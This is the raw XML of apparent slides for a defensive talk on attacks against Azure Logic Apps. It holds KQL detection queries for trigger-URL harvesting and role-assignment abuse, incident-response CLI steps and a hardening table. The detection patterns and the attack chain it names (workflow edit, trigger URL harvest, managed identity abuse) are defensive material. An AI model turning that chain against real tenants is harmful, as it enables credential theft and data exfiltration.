                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ACDE660D-C6DA-29D6-E605-4E067E7137F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="3429000"/>
            <a:ext cx="11430000" cy="1292662"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>AzureActivity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where TimeGenerated &gt; ago(30d)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where OperationName has "listCallbackUrl"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where ActivityStatus == "Succeeded"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| project TimeGenerated, Caller,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>          CallerIpAddress, ResourceId, ResourceGroup</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382767447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93F6-869E-5A67-67D9-4813BE515F5D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>KQL — Full Suspicious Activity Summary</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4D9C4C87-AE32-807F-0911-1F92DAA2BF6F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>What to look for: A single Caller performing multiple operation types (workflow write + trigger URL retrieval + RBAC write) within a short window - this pattern strongly indicates an adversary chain.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4B412FD-A24E-3BB8-68BA-D2250ADE65DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="3429000"/>
            <a:ext cx="11430000" cy="2215991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>AzureActivity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where TimeGenerated &gt; ago(7d)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where ResourceProvider == "MICROSOFT.LOGIC"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    or OperationName has</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        "Microsoft.Authorization/roleAssignments"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where ActivityStatus == "Succeeded"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| summarize</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    Operations = make_set(OperationName),</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    Count = count()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    by Caller, CallerIpAddress,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    ResourceGroup, bin(TimeGenerated, 1h)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| order by Count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192665229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DE714-CD55-FDC4-1AA1-35E5CF223EC8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Incident Response</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FCC55E0B-E378-CE54-F0F8-644A3B74B4A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1"/>
              <a:t>Step 1 - Disable the compromised workflow:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    az logic workflow update --state Disabled - stops all active runs and future triggers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1"/>
              <a:t>Step 2 - Revoke unauthorized RBAC assignments:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    az role assignment delete --assignee &lt;attacker-id&gt; --role "Logic App Contributor"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25356457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189EC-26E3-5DF8-5F10-C4338DF75D6D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Incident Response (cont. 2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2C8EA919-C9AC-0DA4-E56C-7AD5CA68C38D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1"/>
              <a:t>Step 3 - Invalidate trigger SAS URLs:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    Delete and recreate the trigger - new trigger generates new sig= token</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    Any exfiltrated URLs become immediately invalid</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1"/>
              <a:t>Step 4 - Review run history:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    Examine inputs and outputs of each action in affected runs to determine exfiltration scope</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="333893228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04DE6-624E-607D-8491-0AC20FECB37E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Incident Response (cont. 3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D5CC15B-647C-2635-9FA4-25C48E4B14AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1"/>
              <a:t>Step 5 - Rotate secrets:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    Replace connection strings, Application Programming Interface (API) keys, and storage account keys referenced by the workflow</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="396278762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A4C92-5CFF-5B75-1FA0-83F4F14870EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Hardening Controls</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A0363C06-9766-42C2-38E7-05776409C4E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4141580173"/>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2389128405"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="5715000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="562538651"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1"/>
                        <a:t>Control</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1"/>
                        <a:t>What It Prevents</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2209845960"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Restrict connector types via Azure Policy</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Blocks HTTP connector for unauthorized data exfiltration</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2541783532"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="it-IT" sz="1200"/>
                        <a:t>Separate Logic App Contributor from MI Operator</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Prevents same user from editing workflows AND assigning managed identities</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3583551409"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Store secrets in Azure Key Vault</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Eliminates hardcoded secrets from workflow JSON definitions</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3214179766"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Enable Secure Inputs/Outputs</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Hides sensitive data from run history</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4238456264"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Enable diagnostic logging (WorkflowRuntime)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Ensures AzureDiagnostics captures action-level details</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3931879542"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Azure Resource Locks on production workflows</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Prevents accidental or malicious modification/deletion</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1969634160"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Lifecycle management</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Disable Logic Apps not modified or reviewed in 90 days</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="495403273"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="156495507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ADE3E-EB18-7395-A3AF-D5CC1664932A}"/>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5F2D426D-FE66-04F7-3499-AEFE1109CD96}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>Logic Apps combine code execution, credential access, and external connectivity - a powerful attack surface</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>Three attack vectors chain together: workflow edit, trigger URL harvest, managed identity abuse</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="291300386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C0DB0-50B3-C2C4-BB5C-BBE6D4DD0A1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Key Takeaways (cont. 2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FAF13590-9F75-3C2C-5D96-D8CB88673A62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>AzureActivity is the primary detection surface - monitor workflows/write, listCallbackUrl, and roleAssignments/write</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>First-time callers editing workflows are the highest-priority anomaly signal</a:t>
            </a:r>
          </a:p>
          <a:p>
